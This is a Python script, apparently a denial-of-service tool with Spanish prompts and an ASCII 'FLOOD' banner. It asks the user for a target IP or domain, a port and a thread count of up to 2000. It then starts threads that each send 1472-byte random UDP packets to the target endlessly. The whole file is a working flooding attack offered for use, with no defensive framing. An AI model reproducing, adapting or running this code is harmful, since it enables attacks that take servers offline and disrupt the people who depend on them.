#!/usr/bin/env python3
# Modified for ricardo_12 - MAX POWER

import os
import random
import socket
import threading

# Limpiar pantalla y mostrar banner
os.system("clear")
print("\033[1;31m")  # Rojo
print("""
███████╗██╗      ██████╗  ██████╗ ██████╗ 
██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
█████╗  ██║     ██║   ██║██║   ██║██║  ██║
██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║
██      ███████╗╚██████╔╝╚██████╔╝██████╔╝
╚        ══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
""")
print("\033[1;33mModified for ricardo_12 - MAX POWER\033[0m")
print("\033[1;36m--> C0de By Lee0n123 <--\033[0m")
print("\033[1;36m#-- MAX POWER FLOOD --#\033[0m\n")

# Función para entrada con mensaje
def get_input(message):
    return input(f"\033[1;34m[?] {message}: \033[0m")

# Obtener datos interactivamente
ip = get_input("Ingresa la IP o dominio objetivo")
port = int(get_input("Ingresa el puerto objetivo (ej: 19132)"))
threads = int(get_input("Número de hilos (MAX: 2000)"))

# Mostrar resumen
print(f"\n\033[1;33m[!] Iniciando ataque MAX POWER:")
print(f"   Target: {ip}:{port}")
print(f"   Hilos: {threads}")
print(f"   Método: UDP")
print(f"   Paquetes: 1472 bytes\033[0m")
print("\033[1;31m[!] Ataque iniciado... Ctrl+C para detener\033[0m\n")

# --- CÓDIGO MAX POWER ---
def run():
    data = random._urandom(1472)  # MÁXIMO tamaño
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            addr = (str(ip), int(port))
            while True:
                s.sendto(data, addr)
        except:
            pass

# Iniciar TODOS los hilos
for y in range(threads):
    th = threading.Thread(target=run)
    th.daemon = True
    th.start()

# Mantener el script vivo
while True:
    threading.Event().wait(1)
